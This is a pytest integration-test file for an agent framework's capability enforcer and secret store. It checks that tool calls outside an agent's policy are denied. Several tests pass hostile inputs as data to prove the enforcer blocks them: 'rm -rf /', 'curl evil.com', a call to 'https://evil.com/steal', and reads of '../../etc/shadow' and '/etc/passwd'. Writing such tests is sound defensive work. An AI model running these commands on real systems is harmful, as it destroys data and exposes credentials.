"""Integration tests — capability enforcement in workflows.

Tests: enforcer + Tier 1 adapter, adversarial tool calls blocked,
multi-agent policy isolation, enforcer + secrets + DAG execution.
"""

from __future__ import annotations

import pytest

from agentos.kernel.budget_manager import BudgetManager
from agentos.kernel.dag_executor import DAGExecutor
from agentos.kernel.event_log import SQLiteEventLog
from agentos.kernel.seq import SeqCounter
from agentos.schemas.budget import BudgetSpec
from agentos.schemas.capability import CapabilityGrant, CapabilityPolicy
from agentos.schemas.events import EventType
from agentos.schemas.task import TaskConfig, TaskOutput, TaskStatus
from agentos.schemas.workflow import WorkflowDefinition
from agentos.security.enforcer import CapabilityDeniedError, CapabilityEnforcer
from agentos.security.secrets import SecretAccessDenied, SecretStore


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def event_log():
    return SQLiteEventLog()


@pytest.fixture
def seq():
    return SeqCounter()


# ---------------------------------------------------------------------------
# Tests: Enforcer in workflow execution
# ---------------------------------------------------------------------------

@pytest.mark.integration
class TestEnforcerInWorkflow:
    """CapabilityEnforcer checks tool calls during DAG task execution."""

    def test_allowed_tools_succeed(self, event_log, seq):
        wf = WorkflowDefinition(
            name="enforce-ok",
            tasks={"a": TaskConfig(name="a", agent="ag1")},
            agents={"ag1": {"tools": ["file_read", "file_write"]}},
        )
        budget_mgr = BudgetManager(
            workflow_spec=wf.budget, event_log=event_log, seq=seq,
            workflow_id="e1",
        )
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[
                CapabilityGrant(type="tool:file_read"),
                CapabilityGrant(type="tool:file_write"),
                CapabilityGrant(type="path:*"),
            ],
        )
        enforcer = CapabilityEnforcer(
            {"ag1": policy}, event_log, seq, "e1",
        )

        def executor(name, config, predecessors=None):
            # Simulate tool calls that the enforcer checks
            enforcer.check_tool_call("ag1", "file_read", {"path": "src/main.py"})
            enforcer.check_tool_call("ag1", "file_write", {"path": "output.txt", "content": "done"})
            return TaskStatus.SUCCEEDED

        dag = DAGExecutor(
            workflow=wf, event_log=event_log, seq=seq,
            budget_manager=budget_mgr, task_executor=executor,
        )
        result = dag.run("e1")

        assert result.status == "succeeded"
        granted = event_log.query(workflow_id="e1", event_type=EventType.CAPABILITY_GRANTED)
        assert len(granted) == 2

    def test_blocked_tool_fails_task(self, event_log, seq):
        """Agent tries shell_exec without permission → task fails."""
        wf = WorkflowDefinition(
            name="enforce-block",
            tasks={"a": TaskConfig(name="a", agent="ag1")},
            agents={"ag1": {}},
        )
        budget_mgr = BudgetManager(
            workflow_spec=wf.budget, event_log=event_log, seq=seq,
            workflow_id="e2",
        )
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[CapabilityGrant(type="tool:file_read")],
        )
        enforcer = CapabilityEnforcer(
            {"ag1": policy}, event_log, seq, "e2",
        )

        def executor(name, config, predecessors=None):
            enforcer.check_tool_call("ag1", "shell_exec", {"command": "rm -rf /"})
            return TaskStatus.SUCCEEDED

        dag = DAGExecutor(
            workflow=wf, event_log=event_log, seq=seq,
            budget_manager=budget_mgr, task_executor=executor,
        )
        result = dag.run("e2")

        assert result.status == "failed"
        denied = event_log.query(workflow_id="e2", event_type=EventType.CAPABILITY_DENIED)
        assert len(denied) == 1
        assert denied[0].payload["tool_name"] == "shell_exec"


@pytest.mark.integration
class TestAdversarialToolCalls:
    """Agents attempting to escape their sandbox via tool calls."""

    def test_path_traversal_blocked(self, event_log, seq):
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[
                CapabilityGrant(type="tool:file_read"),
                CapabilityGrant(type="path:workspace/*"),
            ],
        )
        enforcer = CapabilityEnforcer({"ag1": policy}, event_log, seq, "adv1")

        with pytest.raises(CapabilityDeniedError, match="path traversal"):
            enforcer.check_tool_call("ag1", "file_read", {"path": "../../etc/shadow"})

    def test_read_outside_workspace(self, event_log, seq):
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[
                CapabilityGrant(type="tool:file_read"),
                CapabilityGrant(type="path:src/*"),
            ],
        )
        enforcer = CapabilityEnforcer({"ag1": policy}, event_log, seq, "adv2")

        with pytest.raises(CapabilityDeniedError, match="path not in scope"):
            enforcer.check_tool_call("ag1", "file_read", {"path": "/etc/passwd"})

    def test_network_exfiltration_blocked(self, event_log, seq):
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[
                CapabilityGrant(type="tool:web_search"),
                CapabilityGrant(type="domain:docs.python.org"),
            ],
        )
        enforcer = CapabilityEnforcer({"ag1": policy}, event_log, seq, "adv3")

        with pytest.raises(CapabilityDeniedError, match="domain not in whitelist"):
            enforcer.check_tool_call("ag1", "web_search", {
                "query": "exfiltrate", "url": "https://evil.com/steal",
            })

    def test_tool_escalation_blocked(self, event_log, seq):
        """Agent with file_read tries shell_exec."""
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[CapabilityGrant(type="tool:file_read")],
        )
        enforcer = CapabilityEnforcer({"ag1": policy}, event_log, seq, "adv4")

        with pytest.raises(CapabilityDeniedError, match="tool not in allowlist"):
            enforcer.check_tool_call("ag1", "shell_exec", {"command": "curl evil.com"})


@pytest.mark.integration
class TestMultiAgentIsolation:
    """Two agents with different policies in the same workflow."""

    def test_agents_isolated(self, event_log, seq):
        policy_a = CapabilityPolicy(
            agent_id="ag_a",
            grants=[
                CapabilityGrant(type="tool:file_read"),
                CapabilityGrant(type="path:src/*"),
            ],
        )
        policy_b = CapabilityPolicy(
            agent_id="ag_b",
            grants=[
                CapabilityGrant(type="tool:file_read"),
                CapabilityGrant(type="tool:file_write"),
                CapabilityGrant(type="path:output/*"),
            ],
        )
        enforcer = CapabilityEnforcer(
            {"ag_a": policy_a, "ag_b": policy_b},
            event_log, seq, "iso1",
        )

        # ag_a can read src, not output
        enforcer.check_tool_call("ag_a", "file_read", {"path": "src/main.py"})
        with pytest.raises(CapabilityDeniedError):
            enforcer.check_tool_call("ag_a", "file_read", {"path": "output/data.json"})

        # ag_a cannot write at all
        with pytest.raises(CapabilityDeniedError):
            enforcer.check_tool_call("ag_a", "file_write", {"path": "src/hack.py", "content": ""})

        # ag_b can read+write output, not src
        enforcer.check_tool_call("ag_b", "file_write", {"path": "output/data.json", "content": "{}"})
        with pytest.raises(CapabilityDeniedError):
            enforcer.check_tool_call("ag_b", "file_read", {"path": "src/main.py"})


@pytest.mark.integration
class TestSecretsInWorkflow:
    """SecretStore with capability enforcement in a workflow context."""

    def test_agent_accesses_allowed_secret(self, event_log, seq):
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[CapabilityGrant(type="action:secret:API_KEY")],
        )
        store = SecretStore({"ag1": policy}, event_log, seq, "sec1")
        store.set("API_KEY", "sk-12345")

        wf = WorkflowDefinition(
            name="secret-wf",
            tasks={"a": TaskConfig(name="a", agent="ag1")},
            agents={"ag1": {}},
        )
        budget_mgr = BudgetManager(
            workflow_spec=wf.budget, event_log=event_log, seq=seq,
            workflow_id="sec1",
        )

        def executor(name, config, predecessors=None):
            key = store.get("ag1", "API_KEY")
            assert key == "sk-12345"
            return TaskStatus.SUCCEEDED

        dag = DAGExecutor(
            workflow=wf, event_log=event_log, seq=seq,
            budget_manager=budget_mgr, task_executor=executor,
        )
        result = dag.run("sec1")

        assert result.status == "succeeded"

        # Verify secret value is NOT in any event
        all_events = event_log.replay("sec1")
        for event in all_events:
            assert "sk-12345" not in str(event.payload)

    def test_agent_blocked_from_other_secret(self, event_log, seq):
        policy = CapabilityPolicy(
            agent_id="ag1",
            grants=[CapabilityGrant(type="action:secret:API_KEY")],
        )
        store = SecretStore({"ag1": policy}, event_log, seq, "sec2")
        store.set("API_KEY", "sk-12345")
        store.set("DB_PASS", "supersecret")

        wf = WorkflowDefinition(
            name="secret-block",
            tasks={"a": TaskConfig(name="a", agent="ag1")},
            agents={"ag1": {}},
        )
        budget_mgr = BudgetManager(
            workflow_spec=wf.budget, event_log=event_log, seq=seq,
            workflow_id="sec2",
        )

        def executor(name, config, predecessors=None):
            store.get("ag1", "DB_PASS")
            return TaskStatus.SUCCEEDED

        dag = DAGExecutor(
            workflow=wf, event_log=event_log, seq=seq,
            budget_manager=budget_mgr, task_executor=executor,
        )
        result = dag.run("sec2")

        # SecretAccessDenied is caught by DAGExecutor as an exception → task fails
        assert result.status == "failed"

        denied = event_log.query(workflow_id="sec2", event_type=EventType.CAPABILITY_DENIED)
        assert len(denied) == 1
        assert denied[0].payload["action"] == "secret:DB_PASS"
